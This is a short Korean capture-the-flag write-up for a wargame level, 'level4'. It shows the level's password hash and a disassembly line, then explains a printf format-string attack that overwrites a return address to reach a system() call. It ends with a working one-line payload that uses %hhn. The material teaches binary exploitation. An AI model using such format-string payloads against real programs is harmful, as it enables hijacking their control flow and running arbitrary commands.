> Password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

이전 레벨과 비슷하게 printf의 포맷 스트링을 이용한 문제이다.

하지만 이번에는

```
8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
```

0x1025544라는 매우 큰 값을 넣어야 한다는 점이 다르다. 만약 이 값을 그대로 넣는다고 하면 4개로 쪼개서 계산하여 넣어야 하는데 가능은 하지만 꽤 복잡하므로 다른 접근을 생각해보자.

main 함수 쪽에 있는 n함수의 복귀 주소와 p함수에서 cmp 이후 system(3)을 호출하는 부분의 주소 차이가 멀지 않다는 점을 이용해서 ret 주소를 변조하는 방법으로 접근할 수 있다. 

```bash
python -c 'print "\xdc\xf4\xff\xbf%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%0149u%hhn",' | ./level4
```